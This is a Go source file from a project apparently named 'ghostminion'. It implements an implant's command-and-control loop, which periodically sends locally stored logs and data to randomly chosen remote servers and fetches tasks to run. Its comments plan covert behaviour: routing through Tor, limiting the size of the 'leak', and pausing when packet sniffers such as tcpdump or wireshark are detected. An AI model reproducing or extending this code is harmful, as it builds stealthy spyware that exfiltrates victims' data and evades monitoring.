package communication

import (
	"encoding/json"
	"ghostminion/apps"
	"ghostminion/config"
	"ghostminion/db"
	"math/rand"
	"strconv"
	"time"
)

/*

consider using tor for hidden communication.

don't send too much data (its a little risky) - make leak limit
don't leakDataAndGetTasks if there are sniffers (tcpdump, wireshark, etc..)
don't leakDataAndGetTasks if there is too much cpu usage
todo: search for more risky communication times

*/

func Routine(taskCh chan<- apps.AppData) {
	conf, _ := config.GetConfig()
	intervalSeconds, _ := strconv.Atoi(conf.Communication.Interval)
	ticker := time.NewTicker(time.Duration(intervalSeconds) * time.Second)
	defer ticker.Stop()

	for {
		<-ticker.C
		serverConfig := getRandomServer()
		if !CanCommunicate(serverConfig) {
			lgr.Error("Can't communicate with server", serverConfig.Address)
		} else {
			sendData("logs")
			sendData("data")
			tasks := fetchTasks(serverConfig)
			for _, task := range tasks {
				taskCh <- task
			}
		}
	}
}

func sendData(table string) {

	for {
		result, err := db.ReadOldestDataRow(table)
		if err != nil {
			return
		}

		jsonData, err := json.Marshal(result)
		if err != nil {
			return
		}
		_, _, _ = SendRequest(
			POST,
			CreateRoute(getRandomServer(), "receive"),
			map[string]string{
				"Content-Type": "application/json",
			},
			jsonData,
		)
	}
}

func fetchTasks(serverConfig config.ServerConfig) []apps.AppData {
	tasksRaw, _, err := SendRequest(
		GET,
		CreateRoute(serverConfig, "tasks"),
		map[string]string{
			"Accept": "application/json",
		},
		nil,
	)
	if err != nil {
		lgr.Error("Got error while fetching tasks", err)
		return nil
	}

	var tasks []apps.AppData
	if err := json.Unmarshal(tasksRaw, &tasks); err != nil {
		lgr.Error("Got error while unmarshalling tasks", err)
		return nil
	}

	return tasks
}

func getRandomServer() config.ServerConfig {
	configInstance, err := config.GetConfig()
	if err != nil {
		return config.ServerConfig{}
	}
	servers := configInstance.Communication.Servers
	if len(servers) == 0 {
		return config.ServerConfig{}
	}
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	index := rng.Intn(len(servers))
	return servers[index]
}
